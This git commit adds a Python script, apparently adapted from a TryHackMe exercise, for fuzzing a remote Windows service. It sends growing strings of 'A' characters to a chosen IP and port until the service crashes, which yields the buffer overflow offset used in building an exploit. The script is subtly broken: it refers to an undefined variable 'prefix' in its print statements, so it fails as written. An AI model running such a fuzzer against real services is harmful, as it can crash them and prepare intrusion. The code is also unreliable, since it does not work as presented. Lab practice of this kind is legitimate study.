1686fc47d5405e966241d4a1999ef3b49d09c995
Tom-project <56174977+Tom-project@users.noreply.github.com>
2021-09-28 14:00:46 +0100

    For fuzzing remote binaries for overflow offset
    A fuzzer to determine the overflow offset of remote binaries. Initially created by tryhackme, adapted by me for general use on other boxes.

---
+++ CustomScripts/Windows-Remote-BOF-Fuzzer.py
@@ -0,0 +1,23 @@
+#Tryhackme.com fuzzer adapted for general use
+import socket, time, sys
+
+ip = input("Enter an IP: ")
+port = int(input("Enter a port: "))
+timeout = 5
+
+string = "A" * 100
+
+while True:
+  try:
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+      s.settimeout(timeout)
+      s.connect((ip, port))
+      s.recv(1024)
+      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
+      s.send(bytes(string, "latin-1"))
+      s.recv(1024)
+  except:
+    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
+    sys.exit(0)
+  string += 100 * "A"
+  time.sleep(1)
